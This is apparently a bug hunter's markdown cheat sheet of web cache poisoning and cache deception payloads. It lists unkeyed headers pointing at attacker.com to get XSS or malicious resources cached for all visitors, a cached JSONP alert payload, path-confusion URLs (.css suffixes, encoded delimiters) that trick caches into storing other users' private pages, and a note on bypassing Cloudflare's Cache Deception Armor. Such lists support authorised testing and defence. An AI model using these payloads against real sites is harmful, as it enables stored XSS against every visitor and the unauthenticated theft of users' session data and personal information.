---
title: "Payloads: Web Cache (Poisoning + Deception)"
type: payloads
tags: [payloads, web-cache, poisoning, deception, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: Web Cache

Unkeyed-input poisoning + deception path tricks. Confirm the poisoned/private response is served to a CLEAN request (no cache-buster). Routed via the `hunt-cache` skill. See [[web-cache-poisoning]], [[web-cache-deception]], [[web-cache-attacks]].

## Fingerprint cache + key
```
Age: / X-Cache: hit|miss / CF-Cache-Status: / Cache-Control: / Vary:
# vary one input at a time with ?cb=RANDOM, watch hit/miss + whether the change persists to a clean request
```

## Unkeyed headers (poisoning - reflected -> harmful, then cached)
```
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps          X-Forwarded-Proto: http
X-Host: attacker.com                  X-Forwarded-Server: attacker.com
X-Original-URL / X-Rewrite-URL: /evil
X-Forwarded-For / True-Client-IP (if reflected)
# discover more with Burp Param Miner: "Guess headers"
```
Goal: reflected header lands in a script src / link / redirect / resource URL -> XSS or malicious resource cached for everyone.

## Fat GET / parameter cloaking
```
GET /?param=val&utm=1 with a body ; duplicate/encoded params the cache and origin key differently
?callback=alert(1)  cached JSONP ; unkeyed query param that changes the body
```

## Cache deception (store a victim's private page as static)
```
/account/profile.css        /account/profile/nonexistent.js
/account/profile;script.js  (path-param delimiter)
/account/profile%00.css     /account/profile%2f%2e%2e%2fx.css
/account/profile/..%2fx.js  (cache stores literal, origin normalizes)
```
If the cache stores it as static + origin returns the private content -> fetch another user's data unauth.

## CDN notes
```
Cloudflare caches by extension (css js jpg png gif pdf zip ...), not MIME
Cache Deception Armor bypass: application/octet-stream ; .jpg served as image/webp
```

## Real-world
X-Forwarded-Host -> cached XSS (Kettle's Practical Web Cache Poisoning), and `.css`-suffix deception leaking session/PII, are repeated high-impact reports.
